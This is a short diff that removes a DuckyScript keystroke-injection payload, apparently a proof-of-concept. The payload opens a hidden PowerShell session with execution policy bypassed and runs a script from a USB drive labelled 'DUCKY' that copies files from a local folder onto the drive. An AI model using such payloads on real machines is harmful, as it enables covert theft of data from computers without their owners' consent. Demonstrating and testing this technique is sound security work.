@@ -1,5 +1,0 @@
-DELAY 2000
-GUI r
-DELAY 300
-STRING powershell -NoP -W Hidden -ExecutionPolicy Bypass -Command "$v=Get-Volume -FileSystemLabel 'DUCKY' -ErrorAction SilentlyContinue | ? DriveType -eq 'Removable' | select -First 1; if($v){ & (Join-Path ($v.DriveLetter+':\') 'Copy-DummyToUsb.ps1') -Source 'C:\POC\Source' -UsbLabel 'DUCKY' -MaxMB 200 }"
-ENTER
